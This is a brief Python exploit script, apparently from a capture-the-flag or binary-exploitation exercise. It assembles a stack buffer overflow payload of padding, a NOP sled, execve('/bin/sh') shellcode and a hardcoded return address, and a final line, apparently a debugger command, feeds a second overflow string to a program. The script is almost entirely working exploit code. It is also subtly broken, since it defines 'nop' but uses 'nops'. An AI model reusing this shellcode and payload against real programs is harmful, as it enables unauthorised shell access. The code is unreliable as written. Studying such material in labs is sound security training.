import sys

shellcode = b"jhh\x2f\x2f\x2fsh\x2fbin\x89\xe3h\x01\x01\x01\x01\x814\x24ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"
padding = b"\x41" * (268-64-len(shellcode))
nop = b"\x90" * 64
eip = b"\x6c\xd1\xff\xff"

payload = padding + nops + shellcode + eip
#payload = padding + badchars

#with open('exploit', 'wb') as f:
#    f.write(payload)

#sys.stdout.buffer.write(payload)




r < <(python -c "import sys; sys.stdout.buffer.write(b'A' * 140 + b'\xef\xbe\xad\xde\xff\x7f\x00\x00')")